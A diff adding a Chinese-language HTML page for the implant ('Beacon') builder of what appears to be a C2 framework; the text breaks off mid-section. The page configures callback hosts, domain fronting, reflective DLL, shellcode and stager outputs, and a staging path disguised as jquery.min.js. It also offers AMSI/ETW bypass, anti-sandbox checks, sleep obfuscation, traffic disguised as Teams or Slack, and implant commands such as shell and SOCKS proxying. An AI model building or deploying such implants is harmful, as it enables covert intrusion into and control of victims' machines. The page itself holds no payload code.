@@ -1,0 +1,705 @@
+<!-- client 页面 - 从 1index.html 自动提取 -->
+<div id="clientPage" class="page-content">
+    <div class="max-w-full mx-auto px-6 py-6">
+        <div class="flex items-center justify-between mb-6">
+            <div>
+                <h2 class="text-2xl font-bold flex items-center">
+                    <i class="fas fa-desktop mr-2 text-indigo-400"></i>
+                    客户端生成
+                </h2>
+                <p class="text-sm text-gray-400 mt-1">在服务器上执行 cargo build --release，完成后可在此下载生成的客户端程序。</p>
+            </div>
+        </div>
+
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+            <!-- 左侧：操作与状态 -->
+            <div class="lg:col-span-2 space-y-4">
+                <div class="chart-card">
+                    <div class="flex items-center justify-between mb-4">
+                        <div>
+                            <h3 class="text-lg font-semibold flex items-center">
+                                <i class="fas fa-sliders-h mr-2 text-indigo-400"></i>
+                                客户端配置
+                            </h3>
+                            <p class="text-sm text-gray-400 mt-1">
+                                配置客户端连接的 C2 Host/IP、端口和协议；留空则使用默认值。
+                            </p>
+                        </div>
+                    </div>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                        <div>
+                            <label for="clientHost" class="form-label">C2 Host / 域名</label>
+                            <input type="text" id="clientHost" class="input-field" placeholder="例如 192.168.149.1 或 c2.example.com">
+                        </div>
+                        <div>
+                            <label for="clientIP" class="form-label">回连 IP（可选）</label>
+                            <input type="text" id="clientIP" class="input-field" placeholder="默认为上面的 Host">
+                        </div>
+                        <div>
+                            <label for="clientPort" class="form-label">端口</label>
+                            <input type="number" id="clientPort" class="input-field" placeholder="默认 5005">
+                        </div>
+                        <div>
+                            <label for="clientProtocol" class="form-label">协议</label>
+                            <select id="clientProtocol" class="input-field">
+                                <option value="">默认（http）</option>
+                                <option value="http">HTTP</option>
+                                <option value="https">HTTPS</option>
+                                <option value="tcp">TCP</option>
+                                <option value="udp">UDP</option>
+                                <option value="dns">DNS</option>
+                            </select>
+                        </div>
+                        <!-- 域前置配置 -->
+                        <div>
+                            <label for="domainFrontHost" class="form-label">域前置域名（可选）</label>
+                            <input type="text" id="domainFrontHost" class="input-field" placeholder="例如 d1234.cloudfront.net（留空则不启用域前置）">
+                            <p class="text-xs text-gray-500 mt-1">
+                                启用域前置后，HTTP/HTTPS 请求的 Host 头将使用此域名，而实际 TCP 连接仍使用上方的 IP。
+                                <br><span class="text-yellow-500">💡 需要配合 CDN（如 CloudFront、Azure CDN）使用，确保 CDN 将请求转发到你的 C2 服务器。</span>
+                            </p>
+                        </div>
+                        <!-- 目标平台选择 -->
+                        <div id="targetPlatformContainer">
+                            <label for="targetOS" class="form-label">
+                                <i class="fas fa-desktop mr-1"></i>目标平台
+                            </label>
+                            <div class="grid grid-cols-2 gap-3">
+                                <div>
+                                    <label for="targetOS" class="text-xs text-gray-400 mb-1 block">操作系统</label>
+                                    <select id="targetOS" class="input-field">
+                                        <option value="windows" selected>🪟 Windows</option>
+                                        <option value="linux">🐧 Linux</option>
+                                    </select>
+                                </div>
+                                <div>
+                                    <label for="targetArch" class="text-xs text-gray-400 mb-1 block">架构</label>
+                                    <select id="targetArch" class="input-field">
+                                        <option value="x86_64" selected>x86_64 (AMD64)</option>
+                                        <option value="aarch64">aarch64 (ARM64)</option>
+                                    </select>
+                                </div>
+                            </div>
+                            <p id="platformHint" class="text-xs text-gray-500 mt-1">
+                                <span id="platformHintWindows">Windows 目标支持所有输出格式和安全特性。</span>
+                                <span id="platformHintLinux" style="display:none;">
+                                    <span class="text-yellow-500">⚠️ Linux 目标</span>：仅支持 ELF 可执行文件输出，Windows 专属安全特性（Ekko Sleep、ETW/AMSI 规避等）将自动跳过。
+                                    <br><span class="text-blue-400">💡 Linux 编译通过 Docker 容器交叉编译（需要安装 Docker Desktop），目标为 musl 静态链接（无外部依赖）。</span>
+                                </span>
+                            </p>
+                        </div>
+                        <!-- 输出格式选择 -->
+                        <div id="outputFormatContainer">
+                            <label for="outputFormat" class="form-label">输出格式</label>
+                            <select id="outputFormat" class="input-field">
+                                <option value="exe" selected>EXE — 标准可执行文件</option>
+                                <option value="dll">DLL — 反射式动态链接库</option>
+                                <option value="shellcode">Shellcode — 位置无关代码 (sRDI)</option>
+                                <option disabled>── Stager（分阶段加载器）──</option>
+                                <option value="stager_exe">Stager EXE — 分阶段 EXE</option>
+                                <option value="stager_dll">Stager DLL — 分阶段 DLL</option>
+                                <option value="stager_shellcode">Stager Shellcode — 分阶段 Shellcode</option>
+                            </select>
+                            <p class="text-xs text-gray-500 mt-1">
+                                <strong>EXE</strong>：直接运行的独立程序 |
+                                <strong>DLL</strong>：可反射注入的 DLL (含 Execute 导出) |
+                                <strong>Shellcode</strong>：通过 sRDI 转换的位置无关代码
+                                <br><strong>Stager</strong>：极小的下载器，从 C2 拉取完整 Beacon（支持 EXE / DLL / Shellcode 三种格式）
+                            </p>
+                        </div>
+                        <div id="stagingUriContainer" style="display: none;">
+                            <label for="stagingUri" class="form-label">Staging URI 路径</label>
+                            <input type="text" id="stagingUri" class="input-field" placeholder="/assets/jquery.min.js" value="/assets/jquery.min.js">
+                            <p class="text-xs text-gray-500 mt-1">Stager 从 C2 下载完整 Stage 的 URL 路径，应伪装为合法资源（如 .js/.css/.png）。</p>
+                        </div>
+
+                        <!-- ═══ 安全特性说明（Patch 模式） ═══ -->
+                        <div id="securityPresetContainer" class="md:col-span-2">
+                            <div class="flex items-center mb-3">
+                                <i class="fas fa-shield-alt mr-2 text-indigo-400"></i>
+                                <span class="form-label mb-0">安全特性</span>
+                            </div>
+                            <div id="patchModeSecurityNotice" class="text-xs text-gray-400 bg-gray-800/40 rounded-lg p-3 border border-gray-700/50">
+                                <div class="flex items-start gap-2">
+                                    <i class="fas fa-info-circle text-blue-400 mt-0.5"></i>
+                                    <div>
+                                        <p class="text-gray-300 font-medium mb-1">Patch 模式 — 安全特性由模板预编译决定</p>
+                                        <p class="text-gray-500">
+                                            当前使用二进制补丁模式生成 Beacon，安全特性（Stack Spoof、Indirect Syscall、ETW/AMSI 绕过、ThreadPool 栈伪造、反沙箱、堆加密等）
+                                            在模板编译时已固定，无法通过前端选项修改。以下仅显示可在补丁模式下调整的运行时选项。
+                                        </p>
+                                    </div>
+                                </div>
+                                <div id="patchModeTemplateTags" class="flex flex-wrap gap-1.5 mt-2"></div>
+                            </div>
+                        </div>
+
+                        <!-- Ekko Sleep — 可通过 Patch 修改的运行时选项 -->
+                        <div id="ekkoOptionsContainer" class="md:col-span-2 flex flex-col md:flex-row md:items-end md:space-x-4">
+                            <label class="inline-flex items-center mb-2 md:mb-0">
+                                <input type="checkbox" id="ekkoSleep" class="form-checkbox h-4 w-4 text-indigo-500">
+                                <span class="ml-2 text-sm text-gray-300">启用 Ekko Sleep 混淆</span>
+                                <span class="ml-2 text-xs px-1.5 py-0.5 rounded bg-green-500/15 text-green-400 border border-green-500/20">可补丁</span>
+                            </label>
+                            <div>
+                                <label for="ekkoTarget" class="form-label">Ekko 目标段</label>
+                                <select id="ekkoTarget" class="input-field">
+                                    <option value="text">.text 段（推荐）</option>
+                                    <option value="image">整个 image</option>
+                                    <option value="data">.data 段</option>
+                                    <option value="rdata">.rdata 段</option>
+                                    <option value="pdata">.pdata 段</option>
+                                </select>
+                            </div>
+                        </div>
+
+                        <!-- 编译期安全选项 — 隐藏但保留 DOM 元素供 JS 兼容 -->
+                        <div id="advancedSecurityToggle" class="md:col-span-2" style="display: none;"></div>
+                        <div id="advancedSecurityPanel" style="display: none;">
+                            <div id="stackSpoofContainer"><input type="hidden" id="stackSpoof"></div>
+                            <div id="syscallModeContainer"><input type="hidden" id="syscallMode" value="indirect"></div>
+                            <div id="evasionContainer"><input type="hidden" id="evasion"></div>
+                            <div id="evasionHwbpContainer"><input type="hidden" id="evasionHwbp"></div>
+                            <div id="tpExecContainer"><input type="hidden" id="tpExec"></div>
+                            <div id="antiSandboxContainer"><input type="hidden" id="antiSandbox"></div>
+                            <div id="heapEncryptContainer"><input type="hidden" id="heapEncrypt"></div>
+                            <div id="syscallTraceContainer"><input type="hidden" id="syscallTrace"></div>
+                        </div>
+
+                        <div id="debugContainer" class="md:col-span-2">
+                            <label class="inline-flex items-center">
+                                <input type="checkbox" id="debugConsole" class="form-checkbox h-4 w-4 text-yellow-500">
+                                <span class="ml-2 text-sm text-gray-300">开启调试（生成的 EXE 将显示命令行窗口并输出调试信息）</span>
+                            </label>
+                            <p class="text-xs text-gray-500 mt-1">
+                                <span class="text-yellow-500">⚠️ 仅用于开发调试！</span>
+                                勾选后生成的 EXE 会弹出控制台窗口并输出运行日志。正式部署时请务必关闭此选项。
+                            </p>
+                        </div>
+                        <div class="md:col-span-2 grid grid-cols-1 md:grid-cols-2 gap-4 mt-2">
+                            <div>
+                                <label for="httpPathTemplate" class="form-label">HTTP 路径模板</label>
+                                <input type="text" id="httpPathTemplate" class="input-field" placeholder="/static/js/app.{}.js">
+                                <p class="text-xs text-gray-500 mt-1">使用 {} 作为占位符，例如 /static/js/app.{}.js</p>
+                            </div>
+                            <div>
+                                <label for="httpUserAgent" class="form-label">HTTP User-Agent</label>
+                                <input type="text" id="httpUserAgent" class="input-field" placeholder="留空使用默认浏览器 UA">
+                            </div>
+                        </div>
+                    </div>
+
+
+                </div>
+
+                <!-- C2 Profile 可变通信配置 -->
+                <div class="chart-card" id="c2ProfileSection">
+                    <div class="flex items-center justify-between mb-4">
+                        <div>
+                            <h3 class="text-lg font-semibold flex items-center">
+                                <i class="fas fa-fingerprint mr-2 text-cyan-400"></i>
+                                C2 Profile — 流量伪装
+                            </h3>
+                            <p class="text-sm text-gray-400 mt-1">
+                                选择或自定义 C2 通信配置文件，伪装流量为合法服务（Teams/Slack/OneDrive/Azure AD/Google）
+                            </p>
+                        </div>
+                        <div class="flex items-center space-x-2">
+                            <span class="text-xs px-2 py-1 rounded bg-cyan-500/20 text-cyan-400 font-semibold" id="c2ProfileActiveBadge">default</span>
+                            <button onclick="window.c2ProfileToggleEditor()" class="text-xs px-3 py-1 bg-gray-600 hover:bg-gray-500 text-gray-300 rounded transition-colors">
+                                <i class="fas fa-edit mr-1"></i>高级编辑
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- 预设选择器 -->
+                    <div class="mb-4">
+                        <label class="form-label">预设 Profile</label>
+                        <div class="flex items-center space-x-3">
+                            <select id="c2ProfileSelect" class="input-field flex-1">
+                                <option value="">加载中...</option>
+                            </select>
+                            <button onclick="window.c2ProfileApplyPreset()" class="btn-primary text-sm px-4 py-2">
+                                <i class="fas fa-exchange-alt mr-1"></i>应用
+                            </button>
+                        </div>
+                        <p class="text-xs text-gray-500 mt-1">切换预设会更新下方所有参数。构建客户端时将使用当前 Profile 的加密密钥和通信参数。</p>
+                    </div>
+
+                    <!-- 快速预览：当前 Profile 关键参数 -->
+                    <div class="grid grid-cols-2 md:grid-cols-4 gap-3 mb-4 text-xs">
+                        <div class="bg-gray-800/60 rounded-lg p-2 border border-gray-700">
+                            <span class="text-gray-500 block">Cookie 名</span>
+                            <span class="text-cyan-400 font-mono truncate block" id="c2PreviewCookie">BA_HECTORDD</span>
+                        </div>
+                        <div class="bg-gray-800/60 rounded-lg p-2 border border-gray-700">
+                            <span class="text-gray-500 block">AES Key</span>
+                            <span class="text-green-400 font-mono truncate block" id="c2PreviewAESKey">1234...3456</span>
+                        </div>
+                        <div class="bg-gray-800/60 rounded-lg p-2 border border-gray-700">
+                            <span class="text-gray-500 block">数据标记</span>
+                            <span class="text-yellow-400 font-mono truncate block" id="c2PreviewMarker">const hiddenData</span>
+                        </div>
+                        <div class="bg-gray-800/60 rounded-lg p-2 border border-gray-700">
+                            <span class="text-gray-500 block">Content-Type</span>
+                            <span class="text-purple-400 font-mono truncate block" id="c2PreviewContentType">application/javascript</span>
+                        </div>
+                    </div>
+
+                    <!-- 高级编辑区（默认折叠） -->
+                    <div id="c2ProfileEditorPanel" class="hidden">
+                        <div class="border-t border-gray-700 pt-4 mt-2">
+                            <!-- 基本信息 -->
+                            <h4 class="text-sm font-semibold text-gray-300 mb-3 flex items-center">
+                                <i class="fas fa-info-circle mr-2 text-blue-400"></i>基本信息
+                            </h4>
+                            <div class="grid grid-cols-1 md:grid-cols-3 gap-3 mb-4">
+                                <div>
+                                    <label class="form-label">Profile 名称</label>
+                                    <input type="text" id="c2ProfileName" class="input-field" placeholder="my_custom_profile">
+                                </div>
+                                <div>
+                                    <label class="form-label">描述</label>
+                                    <input type="text" id="c2ProfileDesc" class="input-field" placeholder="My custom C2 profile">
+                                </div>
+                                <div>
+                                    <label class="form-label">作者</label>
+                                    <input type="text" id="c2ProfileAuthor" class="input-field" placeholder="operator">
+                                </div>
+                            </div>
+
+                            <!-- 加密参数 -->
+                            <h4 class="text-sm font-semibold text-gray-300 mb-3 flex items-center">
+                                <i class="fas fa-key mr-2 text-green-400"></i>加密参数
+                                <button onclick="window.c2ProfileRegenerateKeys()" class="ml-3 text-xs px-2 py-0.5 bg-green-500/20 text-green-400 rounded hover:bg-green-500/30">
+                                    <i class="fas fa-sync-alt mr-1"></i>重新生成
+                                </button>
+                            </h4>
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-3 mb-4">
+                                <div>
+                                    <label class="form-label">AES Key（16字符）</label>
+                                    <input type="text" id="c2AESKey" class="input-field font-mono" maxlength="16" placeholder="1234567890123456">
+                                </div>
+                                <div>
+                                    <label class="form-label">AES IV（16字符）</label>
+                                    <input type="text" id="c2AESIV" class="input-field font-mono" maxlength="16" placeholder="1234567890123456">
+                                </div>
+                            </div>
+
+                            <!-- GET 请求配置 -->
+                            <h4 class="text-sm font-semibold text-gray-300 mb-3 flex items-center">
+                                <i class="fas fa-arrow-down mr-2 text-blue-400"></i>GET 请求（Beacon 轮询）
+                            </h4>
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-3 mb-4">
+                                <div>
+                                    <label class="form-label">Cookie 名称</label>
+                                    <input type="text" id="c2GetCookieName" class="input-field font-mono" placeholder="BA_HECTORDD">
+                                </div>
+                                <div>
+                                    <label class="form-label">URI 路径（逗号分隔）</label>
+                                    <input type="text" id="c2GetURIPaths" class="input-field font-mono" placeholder="/static/js/app.{}.js">
+                                </div>
+                            </div>
+                            <div class="mb-4">
+                                <label class="form-label">自定义请求头（每行一个 Key: Value）</label>
+                                <textarea id="c2GetHeaders" class="input-field font-mono text-xs" rows="3" placeholder="X-Requested-With: XMLHttpRequest&#10;Accept-Language: en-US,en;q=0.9"></textarea>
+                            </div>
+
+                            <!-- POST 请求配置 -->
+                            <h4 class="text-sm font-semibold text-gray-300 mb-3 flex items-center">
+                                <i class="fas fa-arrow-up mr-2 text-orange-400"></i>POST 请求（任务回传）
+                            </h4>
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-3 mb-4">
+                                <div>
+                                    <label class="form-label">Cookie 名称</label>
+                                    <input type="text" id="c2PostCookieName" class="input-field font-mono" placeholder="BA_HECTORDD">
+                                </div>
+                                <div>
+                                    <label class="form-label">Content-Type</label>
+                                    <input type="text" id="c2PostContentType" class="input-field font-mono" placeholder="application/octet-stream">
+                                </div>
+                            </div>
+
+                            <!-- 响应配置 -->
+                            <h4 class="text-sm font-semibold text-gray-300 mb-3 flex items-center">
+                                <i class="fas fa-reply mr-2 text-purple-400"></i>响应模板
+                            </h4>
+                            <div class="grid grid-cols-1 md:grid-cols-3 gap-3 mb-4">
+                                <div>
+                                    <label class="form-label">数据标记</label>
+                                    <input type="text" id="c2ResponseMarker" class="input-field font-mono" placeholder="const hiddenData">
+                                </div>
+                                <div>
+                                    <label class="form-label">起始分隔符</label>
+                                    <input type="text" id="c2ResponseDelimStart" class="input-field font-mono" placeholder="=">
+                                </div>
+                                <div>
+                                    <label class="form-label">结束分隔符</label>
+                                    <input type="text" id="c2ResponseDelimEnd" class="input-field font-mono" placeholder=";">
+                                </div>
+                            </div>
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-3 mb-4">
+                                <div>
+                                    <label class="form-label">响应 Content-Type</label>
+                                    <input type="text" id="c2ResponseContentType" class="input-field font-mono" placeholder="application/javascript">
+                                </div>
+                                <div>
+                                    <label class="form-label">无任务返回值</label>
+                                    <input type="text" id="c2ResponseNoTask" class="input-field font-mono" placeholder="UYz2QVy4ydqbZejA9lTAzQ==">
+                                </div>
+                            </div>
+                            <div class="mb-4">
+                                <label class="form-label">响应体模板（{{DATA}} 为数据占位符）</label>
+                                <textarea id="c2ResponseTemplate" class="input-field font-mono text-xs" rows="3" placeholder='var $jscomp=$jscomp||{};$jscomp.scope={}; const hiddenData = {{DATA}};'></textarea>
+                            </div>
+                            <div class="mb-4">
+                                <label class="form-label">自定义响应头（每行一个 Key: Value）</label>
+                                <textarea id="c2ResponseHeaders" class="input-field font-mono text-xs" rows="2" placeholder="X-Content-Type-Options: nosniff"></textarea>
+                            </div>
+
+                            <!-- 保存 / 另存按钮 -->
+                            <div class="flex items-center justify-end space-x-3 pt-3 border-t border-gray-700">
+                                <button onclick="window.c2ProfileSave()" class="btn-primary text-sm">
+                                    <i class="fas fa-save mr-1"></i>保存到当前 Profile
+                                </button>
+                                <button onclick="window.c2ProfileSaveAs()" class="btn-secondary text-sm">
+                                    <i class="fas fa-copy mr-1"></i>另存为新 Profile
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 命令功能选择 -->
+                <div class="chart-card">
+                    <div class="mb-4">
+                        <h3 class="text-lg font-semibold flex items-center">
+                            <i class="fas fa-list-check mr-2 text-purple-400"></i>
+                            命令功能选择
+                        </h3>
+                        <p class="text-sm text-gray-400 mt-1">
+                            选择要编译进客户端的命令功能（未选中的命令将不会编译进客户端，减小体积）
+                        </p>
+                        <!-- Template capability banner (shown in Patch mode) -->
+                        <div id="templateCapabilityBanner" class="hidden mt-2 px-3 py-2 rounded-lg bg-amber-500/10 border border-amber-500/25 text-xs text-amber-300/90">
+                            <i class="fas fa-microchip mr-1.5"></i>正在加载模板信息...
+                        </div>
+                    </div>
+
+                    <div class="flex items-center justify-between mb-3">
+                        <div class="flex items-center space-x-2">
+                            <button onclick="window.selectAllCommands()" class="text-xs px-3 py-1 bg-green-500/20 text-green-400 rounded hover:bg-green-500/30">
+                                <i class="fas fa-check-double mr-1"></i>全选
+                            </button>
+                            <button onclick="window.deselectAllCommands()" class="text-xs px-3 py-1 bg-red-500/20 text-red-400 rounded hover:bg-red-500/30">
+                                <i class="fas fa-times mr-1"></i>全不选
+                            </button>
+                            <button onclick="window.selectBasicCommands()" class="text-xs px-3 py-1 bg-blue-500/20 text-blue-400 rounded hover:bg-blue-500/30">
+                                <i class="fas fa-layer-group mr-1"></i>仅基础
+                            </button>
+                        </div>
+                        <div class="flex items-center space-x-3 text-xs text-gray-500">
+                            <span id="platformCommandHint" class="hidden px-2 py-0.5 rounded bg-yellow-500/15 text-yellow-400 border border-yellow-500/30">
+                                <i class="fas fa-filter mr-1"></i>已按平台过滤
+                            </span>
+                            <span>已选: <span id="selectedCommandCount" class="text-cyan-400 font-semibold">0</span> / <span id="totalCommandCount">0</span></span>
+                        </div>
+                    </div>
+
+                    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3 max-h-96 overflow-y-auto border border-gray-700 rounded-lg p-3 bg-gray-900/30" id="commandSelectionGrid">
+                        <!-- 基础功能 -->
+                        <div class="col-span-full cmd-category" data-category="basic">
+                            <h4 class="text-sm font-semibold text-green-400 mb-2 flex items-center">
+                                <i class="fas fa-folder mr-2"></i>基础功能
+                            </h4>
+                        </div>
+                        <label class="flex items-center space-x-2 p-2 rounded hover:bg-gray-700/30 cursor-pointer cmd-item" data-platform="cross">
+                            <input type="checkbox" class="command-checkbox" value="pwd" checked>
+                            <span class="text-sm text-gray-300">pwd - 当前目录</span>
+                        </label>
+                        <label class="flex items-center space-x-2 p-2 rounded hover:bg-gray-700/30 cursor-pointer cmd-item" data-platform="cross">
+                            <input type="checkbox" class="command-checkbox" value="ls" checked>
+                            <span class="text-sm text-gray-300">ls - 列出文件</span>
+                        </label>
+                        <label class="flex items-center space-x-2 p-2 rounded hover:bg-gray-700/30 cursor-pointer cmd-item" data-platform="cross">
+                            <input type="checkbox" class="command-checkbox" value="cd" checked>
+                            <span class="text-sm text-gray-300">cd - 切换目录</span>
+                        </label>
+                        <label class="flex items-center space-x-2 p-2 rounded hover:bg-gray-700/30 cursor-pointer cmd-item" data-platform="cross">
+                            <input type="checkbox" class="command-checkbox" value="cat" checked>
+                            <span class="text-sm text-gray-300">cat - 读取文件</span>
+                        </label>
+                        <label class="flex items-center space-x-2 p-2 rounded hover:bg-gray-700/30 cursor-pointer cmd-item" data-platform="cross">
+                            <input type="checkbox" class="command-checkbox" value="cp" checked>
+                            <span class="text-sm text-gray-300">cp - 复制文件</span>
+                        </label>
+                        <label class="flex items-center space-x-2 p-2 rounded hover:bg-gray-700/30 cursor-pointer cmd-item" data-platform="cross">
+                            <input type="checkbox" class="command-checkbox" value="mkdir" checked>
+                            <span class="text-sm text-gray-300">mkdir - 创建目录</span>
+                        </label>
+                        <label class="flex items-center space-x-2 p-2 rounded hover:bg-gray-700/30 cursor-pointer cmd-item" data-platform="cross">
+                            <input type="checkbox" class="command-checkbox" value="mkfile" checked>
+                            <span class="text-sm text-gray-300">mkfile - 创建文件</span>
+                        </label>
+                        <label class="flex items-center space-x-2 p-2 rounded hover:bg-gray-700/30 cursor-pointer cmd-item" data-platform="cross">
+                            <input type="checkbox" class="command-checkbox" value="rmdir" checked>
+                            <span class="text-sm text-gray-300">rmdir - 删除目录</span>
+                        </label>
+                        <label class="flex items-center space-x-2 p-2 rounded hover:bg-gray-700/30 cursor-pointer cmd-item" data-platform="cross">
+                            <input type="checkbox" class="command-checkbox" value="rmfile" checked>
+                            <span class="text-sm text-gray-300">rmfile - 删除文件</span>
+                        </label>
+                        <label class="flex items-center space-x-2 p-2 rounded hover:bg-gray-700/30 cursor-pointer cmd-item" data-platform="cross">
+                            <input type="checkbox" class="command-checkbox" value="shell" checked>
+                            <span class="text-sm text-gray-300">shell - 执行Shell</span>
+                        </label>
+                        <label class="flex items-center space-x-2 p-2 rounded hover:bg-gray-700/30 cursor-pointer cmd-item" data-platform="windows">
+                            <input type="checkbox" class="command-checkbox" value="powershell" checked>
+                            <span class="text-sm text-gray-300">powershell - PowerShell命令</span>
+                            <span class="cmd-platform-tag hidden text-xs px-1.5 py-0.5 rounded bg-blue-500/20 text-blue-400 ml-auto">🪟</span>
+                        </label>
+                        <label class="flex items-center space-x-2 p-2 rounded hover:bg-gray-700/30 cursor-pointer cmd-item" data-platform="cross">
+                            <input type="checkbox" class="command-checkbox" value="execute" checked>
+                            <span class="text-sm text-gray-300">execute - 执行程序</span>
+                        </label>
+                        <label class="flex items-center space-x-2 p-2 rounded hover:bg-gray-700/30 cursor-pointer cmd-item" data-platform="cross">
+                            <input type="checkbox" class="command-checkbox" value="spawn" checked>
+                            <span class="text-sm text-gray-300">spawn - 后台执行</span>
+                        </label>
+                        <label class="flex items-center space-x-2 p-2 rounded hover:bg-gray-700/30 cursor-pointer cmd-item" data-platform="cross">
+                            <input type="checkbox" class="command-checkbox" value="getuid" checked>
+                            <span class="text-sm text-gray-300">getuid - 获取用户</span>
+                        </label>
+                        <label class="flex items-center space-x-2 p-2 rounded hover:bg-gray-700/30 cursor-pointer cmd-item" data-platform="cross">
+                            <input type="checkbox" class="command-checkbox" value="sleep" checked>
+                            <span class="text-sm text-gray-300">sleep - 睡眠间隔</span>
+                        </label>
+                        <label class="flex items-center space-x-2 p-2 rounded hover:bg-gray-700/30 cursor-pointer cmd-item" data-platform="cross">
+                            <input type="checkbox" class="command-checkbox" value="exit" checked>
+                            <span class="text-sm text-gray-300">exit - 退出Beacon</span>
+                        </label>
+                        <label class="flex items-center space-x-2 p-2 rounded hover:bg-gray-700/30 cursor-pointer cmd-item" data-platform="cross">
+                            <input type="checkbox" class="command-checkbox" value="upload" checked>
+                            <span class="text-sm text-gray-300">upload - 上传文件</span>
+                        </label>
+                        <label class="flex items-center space-x-2 p-2 rounded hover:bg-gray-700/30 cursor-pointer cmd-item" data-platform="cross">
+                            <input type="checkbox" class="command-checkbox" value="download" checked>
+                            <span class="text-sm text-gray-300">download - 下载文件</span>
+                        </label>
+                        <label class="flex items-center space-x-2 p-2 rounded hover:bg-gray-700/30 cursor-pointer cmd-item" data-platform="cross">
+                            <input type="checkbox" class="command-checkbox" value="filepath" checked>
+                            <span class="text-sm text-gray-300">filepath - 路径操作</span>
+                        </label>
+                        <label class="flex items-center space-x-2 p-2 rounded hover:bg-gray-700/30 cursor-pointer cmd-item" data-platform="windows">
+                            <input type="checkbox" class="command-checkbox" value="switchprotocol" checked>
+                            <span class="text-sm text-gray-300">switchprotocol - 切换协议</span>
+                            <span class="cmd-platform-tag hidden text-xs px-1.5 py-0.5 rounded bg-blue-500/20 text-blue-400 ml-auto">🪟</span>
+                        </label>
+
+                        <!-- 进程管理 -->
+                        <div class="col-span-full mt-2 cmd-category" data-category="process">
+                            <h4 class="text-sm font-semibold text-blue-400 mb-2 flex items-center">
+                                <i class="fas fa-tasks mr-2"></i>进程管理
+                            </h4>
+                        </div>
+                        <label class="flex items-center space-x-2 p-2 rounded hover:bg-gray-700/30 cursor-pointer cmd-item" data-platform="cross">
+                            <input type="checkbox" class="command-checkbox" value="ps" checked>
+                            <span class="text-sm text-gray-300">ps - 进程列表</span>
+                        </label>
+                        <label class="flex items-center space-x-2 p-2 rounded hover:bg-gray-700/30 cursor-pointer cmd-item" data-platform="cross">
+                            <input type="checkbox" class="command-checkbox" value="kill" checked>
+                            <span class="text-sm text-gray-300">kill - 结束进程</span>
+                        </label>
+                        <label class="flex items-center space-x-2 p-2 rounded hover:bg-gray-700/30 cursor-pointer cmd-item" data-platform="cross">
+                            <input type="checkbox" class="command-checkbox" value="pid2path" checked>
+                            <span class="text-sm text-gray-300">pid2path - 进程路径</span>
+                        </label>
+
+                        <!-- 监控模块 -->
+                        <div class="col-span-full mt-2 cmd-category" data-category="spy">
+                            <h4 class="text-sm font-semibold text-yellow-400 mb-2 flex items-center">
+                                <i class="fas fa-eye mr-2"></i>监控模块
+                                <span class="cmd-category-platform-note hidden ml-2 text-xs font-normal text-gray-500">（全部仅限 Windows）</span>
+                            </h4>
+                        </div>
+                        <label class="flex items-center space-x-2 p-2 rounded hover:bg-gray-700/30 cursor-pointer cmd-item" data-platform="windows">
+                            <input type="checkbox" class="command-checkbox" value="screenshot">
+                            <span class="text-sm text-gray-300">screenshot - 屏幕截图</span>
+                            <span class="cmd-platform-tag hidden text-xs px-1.5 py-0.5 rounded bg-blue-500/20 text-blue-400 ml-auto">🪟</span>
+                        </label>
+
+                        <!-- 高级后渗透 -->
+                        <div class="col-span-full mt-2 cmd-category" data-category="advanced">
+                            <h4 class="text-sm font-semibold text-red-400 mb-2 flex items-center">
+                                <i class="fas fa-shield-alt mr-2"></i>高级后渗透
+                            </h4>
+                        </div>
+                        <label class="flex items-center space-x-2 p-2 rounded hover:bg-gray-700/30 cursor-pointer cmd-item" data-platform="windows">
+                            <input type="checkbox" class="command-checkbox" value="load_module">
+                            <span class="text-sm text-gray-300">load_module - 加载模块</span>
+                            <span class="cmd-platform-tag hidden text-xs px-1.5 py-0.5 rounded bg-blue-500/20 text-blue-400 ml-auto">🪟</span>
+                        </label>
+                        <label class="flex items-center space-x-2 p-2 rounded hover:bg-gray-700/30 cursor-pointer cmd-item" data-platform="windows">
+                            <input type="checkbox" class="command-checkbox" value="show_module">
+                            <span class="text-sm text-gray-300">show_module - 显示模块</span>
+                            <span class="cmd-platform-tag hidden text-xs px-1.5 py-0.5 rounded bg-blue-500/20 text-blue-400 ml-auto">🪟</span>
+                        </label>
+                        <label class="flex items-center space-x-2 p-2 rounded hover:bg-gray-700/30 cursor-pointer cmd-item" data-platform="windows">
+                            <input type="checkbox" class="command-checkbox" value="exec_module">
+                            <span class="text-sm text-gray-300">exec_module - 执行模块</span>
+                            <span class="cmd-platform-tag hidden text-xs px-1.5 py-0.5 rounded bg-blue-500/20 text-blue-400 ml-auto">🪟</span>
+                        </label>
+                        <label class="flex items-center space-x-2 p-2 rounded hover:bg-gray-700/30 cursor-pointer cmd-item" data-platform="windows">
+                            <input type="checkbox" class="command-checkbox" value="unload_module">
+                            <span class="text-sm text-gray-300">unload_module - 卸载模块</span>
+                            <span class="cmd-platform-tag hidden text-xs px-1.5 py-0.5 rounded bg-blue-500/20 text-blue-400 ml-auto">🪟</span>
+                        </label>
+                        <label class="flex items-center space-x-2 p-2 rounded hover:bg-gray-700/30 cursor-pointer cmd-item" data-platform="windows">
+                            <input type="checkbox" class="command-checkbox" value="cmd">
+                            <span class="text-sm text-gray-300">cmd - CMD命令</span>
+                            <span class="cmd-platform-tag hidden text-xs px-1.5 py-0.5 rounded bg-blue-500/20 text-blue-400 ml-auto">🪟</span>
+                        </label>
+                        <label class="flex items-center space-x-2 p-2 rounded hover:bg-gray-700/30 cursor-pointer cmd-item" data-platform="cross">
+                            <input type="checkbox" class="command-checkbox" value="socks5">
+                            <span class="text-sm text-gray-300">socks5 - SOCKS5代理</span>
+                        </label>
+                        <label class="flex items-center space-x-2 p-2 rounded hover:bg-gray-700/30 cursor-pointer cmd-item" data-platform="windows">
+                            <input type="checkbox" class="command-checkbox" value="inline_execute">
+                            <span class="text-sm text-gray-300">inline_execute - 内存执行PE</span>
+                            <span class="cmd-platform-tag hidden text-xs px-1.5 py-0.5 rounded bg-blue-500/20 text-blue-400 ml-auto">🪟</span>
+                        </label>
+                    </div>
+                </div>
+
+                <div class="chart-card">
+                    <div class="flex items-center justify-between mb-4">
+                        <div>
+                            <h3 class="text-lg font-semibold flex items-center">
